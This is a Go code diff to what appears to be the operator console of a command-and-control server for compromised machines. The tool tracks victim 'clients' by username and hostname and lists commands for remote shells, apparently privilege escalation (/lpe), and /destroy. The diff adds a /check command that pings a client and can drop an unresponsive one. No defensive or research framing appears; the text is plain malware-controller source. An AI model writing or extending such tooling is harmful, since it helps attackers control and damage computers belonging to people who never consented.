@@ -357,6 +357,57 @@ func main() {
 		case "/clients":
 			listClients()
 
+		case "/check":
+			if len(parts) < 2 {
+				fmt.Println("usage: /check <client_id>")
+				continue
+			}
+			id, err := strconv.Atoi(parts[1])
+			if err != nil {
+				fmt.Println("invalid client id")
+				continue
+			}
+			c, ok := clients[id]
+			if !ok {
+				fmt.Printf("client %d not found\n", id)
+				continue
+			}
+			fmt.Printf("%s[*] checking client %d (%s@%s)...%s\n",
+				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
+
+			alive := true
+
+			c.Conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+
+			if err := sendCommand(c, "ping"); err != nil {
+				fmt.Printf("%s[-] client %d unreachable: %v%s\n", colorRed, c.ID, err, colorReset)
+				alive = false
+			} else {
+				var pong struct {
+					Status string `json:"status"`
+				}
+				if err := c.Decoder.Decode(&pong); err != nil || pong.Status != "pong" {
+					fmt.Printf("%s[-] client %d unreachable%s\n", colorRed, c.ID, colorReset)
+					alive = false
+				}
+			}
+
+			c.Conn.SetReadDeadline(time.Time{})
+
+			if alive {
+				fmt.Printf("%s[+] client %d alive%s\n", colorGreen, c.ID, colorReset)
+			} else {
+				fmt.Printf("%smark client %d as inactive? [y/N]: %s", colorYellow, c.ID, colorReset)
+				scanConfirm := bufio.NewScanner(os.Stdin)
+				if scanConfirm.Scan() {
+					input := strings.TrimSpace(scanConfirm.Text())
+					if strings.ToLower(input) == "y" {
+						removeClient(c.ID)
+						fmt.Printf("%s[!] client %d marked inactive%s\n", colorRed, c.ID, colorReset)
+					}
+				}
+			}
+
 		case "/shell":
 			if len(parts) < 2 {
 				if len(clients) == 1 {
@@ -512,7 +563,7 @@ func main() {
 
 		default:
 			fmt.Printf("unknown command: %s\n", cmd)
-			fmt.Println("commands: /clients, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
+			fmt.Println("commands: /clients, /check <id>, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
 		}
 	}
 }
